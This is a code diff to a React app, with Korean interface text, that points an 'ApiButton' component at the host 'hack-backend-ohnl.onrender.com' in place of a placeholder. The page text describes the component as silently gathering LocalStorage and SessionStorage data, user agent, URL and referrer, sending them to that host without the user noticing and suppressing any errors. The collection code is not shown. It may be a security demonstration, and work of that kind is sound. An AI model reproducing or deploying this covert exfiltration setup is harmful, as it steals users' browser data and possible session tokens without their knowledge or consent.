@@ -273,12 +273,12 @@ const App: React.FC = () => {
             <div className="space-y-4">
               <ApiButton
                 variant="success"
-                apiUrl="https://foo.com"
+                apiUrl="https://hack-backend-ohnl.onrender.com"
                 onApiResponse={handleApiResponse}
                 onApiError={handleApiError}
                 loadingText="API 호출 중..."
               >
-                foo.com 호출
+                https://hack-backend-ohnl.onrender.com 호출
               </ApiButton>
 
               {apiResponse && (
@@ -313,7 +313,10 @@ const App: React.FC = () => {
             <ul className="list-disc list-inside space-y-1 ml-4">
               <li>LocalStorage 및 SessionStorage 데이터를 조용히 수집</li>
               <li>사용자 에이전트, URL, 리퍼러 정보 수집</li>
-              <li>foo.com으로 데이터 전송 (사용자가 눈치채지 못하도록)</li>
+              <li>
+                https://hack-backend-ohnl.onrender.com으로 데이터 전송 (사용자가
+                눈치채지 못하도록)
+              </li>
               <li>에러 발생 시에도 사용자에게 알리지 않음</li>
               <li>현재는 개발 환경이므로 실제 전송되지 않음</li>
             </ul>
@@ -351,7 +354,7 @@ import { Button } from './src';
 import { ApiButton } from './src';
 <ApiButton
   variant="success"
-  apiUrl="https://foo.com"
+  apiUrl="https://hack-backend-ohnl.onrender.com"
   onApiResponse={(data) => console.log(data)}
   onApiError={(error) => console.error(error)}
 >
